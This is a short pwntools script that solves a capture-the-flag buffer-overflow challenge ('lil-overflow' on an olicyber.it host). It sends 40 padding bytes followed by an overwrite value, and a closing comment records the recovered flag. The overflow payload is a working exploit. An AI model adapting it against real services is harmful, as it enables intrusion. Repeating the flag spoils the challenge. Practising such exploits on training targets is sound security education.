from pwn import *

host = "lil-overflow.challs.olicyber.it"
port = 34002

r = remote(host,port)

payload = b"A" * 40 + b"\xb0\x1b\xab\x05"
r.sendline(payload)

print(r.recvall())

#flag{h0w_l0ng_i5_ur_n4m3?}